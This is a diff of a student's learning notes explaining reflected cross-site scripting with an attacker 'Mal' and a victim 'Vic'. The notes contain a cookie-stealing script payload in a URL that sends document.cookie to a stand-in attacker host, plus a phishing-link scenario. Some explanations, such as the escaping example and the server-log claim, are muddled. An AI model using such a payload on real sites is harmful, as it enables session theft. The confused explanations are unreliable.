@@ -17,25 +17,25 @@ Another method of attackers using XSS to use malicious JavaScript → Reflected 
 ## How It Happens 
 **_(circle 3)_**
 
-If a website uses HTTP to execute user’s request and show the results in return → opening a way for attackers to use their JavaScript on it. 
+If a website uses HTTP to execute user’s request and shows the results in return, then is would be opening a way for attackers to use their JavaScript on it. 
 
 **_(circle 4-11)_**
 
 * Mal (attacker) sees that a website uses the aspect of putting search terms into the URL. 
 * Mal knows that search terms will be shown in the URL of the results page → www.welp.com?search=taco (```taco``` is the parameter value for ```search```)  
 * Mal tries to infiltrate the site by making a URL with a section of JavaScript that can help him → ```www.welp.com?search=<script>window.location="http://www.haxxed.com?cookie="+document.cookie</script>``` (in parameter of search )    
-* URL and his JavaScript runs → leading to his browser going to his malicious site 
+* When the URL and his JavaScript runs in the user's browser, this leads to his/her browser going to Mal's malicious site.  
 * Once he was able to be successful, his next step would be to fool someone else to do what he just did, but without knowing that it is not suppose to happen in his favor 
-* 
+
 **Steps That Mal Takes:** 
 1) Send email to Vic (innocent user) in attempt to have him click on the link that catches his attention 
-2) Link clicked → page process the HTML “without escaping it properly” and instead, have it process the script tag that Mal injected 
+2) When the link is clicked by Vic, the page/browser processes the HTML “without escaping it properly” and instead, have it process the script tag that Mal injected.  
     * “without escaping it properly” → Have the code language not transition into another one
         * Mr. Mueller’s example: ```<p> <%  > </p> ``` 
         * The ```>``` for the Ruby section (```<% >```)  
             * Without % → goes from HTML to Ruby and then back to HTML, but the closing tag for Ruby stays the same as the HTML one → letting Mal’s code run in browser  
-3) Once page loads, Mal’s script is ran → leading Vic’s browser to show Mal’s malicious site instead  
-    * Mal gains the ability to see Vic’s server log 
+3) Once page loads, Mal’s script is ran and as a result, Vic’s browser displays Mal’s malicious site instead of the one that he was expecting to see.  
+    * With Vic fooled and lead to the malicious site, Mal gains the ability to see Vic’s server log 
 
 ## Takeaways
 **Use the people around you as resources.** For me, when I was learning about the method Mal would use so that the program is tricked into reading his malicious code, I was confused by the phrase, “escaping properly”. While knowing that Mr. Mueller has encountered this kind of obstacle before (with a link/URL), I went ahead and asked him to see if he understood what it means. It is kind of awesome that one’s struggle and success in something can lead to another person successfully tackle their own obstacle(s). 
